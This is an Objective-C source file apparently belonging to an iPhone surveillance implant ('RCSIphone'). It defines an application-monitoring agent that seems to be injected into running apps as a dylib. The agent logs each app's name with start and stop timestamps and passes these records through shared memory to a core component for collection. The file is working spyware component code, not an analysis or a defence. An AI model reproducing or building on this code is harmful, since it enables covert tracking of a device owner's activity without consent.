//
//  RCSMAgentApplication.m
//  RCSIphone
//
//  Created by kiodo on 12/3/10.
//  Copyright 2010 __MyCompanyName__. All rights reserved.
//

#import "RCSMAgentApplication.h"

#import "RCSMSharedMemory.h"
#import "RCSMCommon.h"

#define TM_SIZE (sizeof(struct tm) - sizeof(long) - sizeof(char*))
#define PROC_START @"START"
#define PROC_STOP  @"STOP"
#define LOG_DELIMITER 0xABADC0DE

//#define DEBUG

static RCSMAgentApplication *sharedAgentApplication = nil;
extern RCSMSharedMemory     *mSharedMemoryLogging;


@implementation RCSMAgentApplication

@synthesize isAppStarted;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSMAgentApplication *)sharedInstance
{
  @synchronized(self)
  {
  if (sharedAgentApplication == nil)
    {
      //
      // Assignment is not done here
      [[self alloc] init];
    }
  }
  
  return sharedAgentApplication;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
  if (sharedAgentApplication == nil)
    {
      sharedAgentApplication = [super allocWithZone: aZone];
      
      // Assignment and return on first allocation
      return sharedAgentApplication;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

- (id)init
{
  self = [super init];
  
  if (self != nil)
      isAppStarted = NO;
    
  return self;
}
#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (BOOL)writeProcessInfoWithStatus: (NSString*)aStatus
{
  struct timeval tp;
  NSData *processName       = [mProcessName dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *pStatus           = [aStatus dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSMutableData *logData    = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData  = [[NSMutableData alloc] init];
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  short unicodeNullTerminator = 0x0000;
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  tmTemp            = gmtime(&rawtime);
  tmTemp->tm_year   += 1900;
  tmTemp->tm_mon    ++;
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  // 0x14 bytes for 64bit processes
  //
  if (sizeof(long) == 4) // 32bit
  {
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x8];
  }
  else if (sizeof(long) == 8) // 64bit
  {
    [entryData appendBytes: (const void *)tmTemp
                    length: sizeof (struct tm) - 0x14];
  }
  
//  //
//  // Our struct is 0x8 bytes bigger than the one declared on win32
//  // this is just a quick fix
//  //
//  [entryData appendBytes: (const void *)tmTemp
//                  length: 36];//sizeof (struct tm) - TM_SIZE];
  
  // Process Name
  [entryData appendData: processName];
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Status of process
  [entryData appendData: pStatus];
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // No process desc: Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Delimeter
  unsigned int del = LOG_DELIMITER;
  [entryData appendBytes: &del
                  length: sizeof(del)];

  gettimeofday(&tp, NULL);
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
//  shMemoryHeader->logID           = 0;
  shMemoryHeader->agentID         = AGENT_APPLICATION;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  if ([mSharedMemoryLogging writeMemory: logData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: Application sent through SHM", __FUNCTION__);
#endif
    }
  else
    {
#ifdef DEBUG
      NSLog(@"[DYLIB] %s: Error while logging Application to shared memory", __FUNCTION__);
#endif
    }

  [logData release];
  [entryData release];

  return YES;
}

- (BOOL)grabInfo: (NSString*)aStatus
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

#ifdef DEBUG
  NSLog(@"[DYLIB] %s: running app agent status %@", __FUNCTION__, aStatus);
#endif
  
  NSBundle *bundle = [NSBundle mainBundle];
  
  NSDictionary *info = [bundle infoDictionary];
  
  mProcessName = (NSString*)[[info objectForKey: (NSString*)kCFBundleExecutableKey] copy];
  mProcessDesc = @"";
  
#ifdef DEBUG
  if (mProcessName != nil) 
    NSLog(@"[DYLIB] %s: application agent info %@", __FUNCTION__, mProcessName);
#endif
  
  [self writeProcessInfoWithStatus: aStatus];
  
  [pool release];
  
  return YES;
}

- (void)sendStartLog
{
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: create start log", __FUNCTION__);
#endif
  if (isAppStarted == YES) 
    [self grabInfo: PROC_START];
}

- (void)sendStopLog
{
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: create stop log", __FUNCTION__);
#endif
  if (isAppStarted == YES)
    [self grabInfo: PROC_STOP];
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG
  NSLog(@"[DYLIB] %s: Agent Application started", __FUNCTION__);
#endif
  
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  
  // Ok application is running
  [self grabInfo: PROC_START];

  // wait for termination and write down the log      
  [[NSNotificationCenter defaultCenter] addObserver: self
                                           selector: @selector(sendStopLog)
                                               name: NSApplicationWillTerminateNotification
                                             object: nil];
  
  sleep(1);
  
  isAppStarted = YES;
  
  [outerPool release];
}

- (BOOL)stop
{
  // stop writing down STOP log
  [[NSNotificationCenter defaultCenter] removeObserver:self];

#ifdef DEBUG
  NSLog(@"[DYLIB] %s: stopping Application Agent", __FUNCTION__);
#endif
  
  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
  
  isAppStarted = NO;
  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mAgentConfiguration)
    {
      [mAgentConfiguration release];
      mAgentConfiguration = [aConfiguration retain];
    }
}

- (NSMutableDictionary *)mAgentConfiguration
{
  return mAgentConfiguration;
}

@end
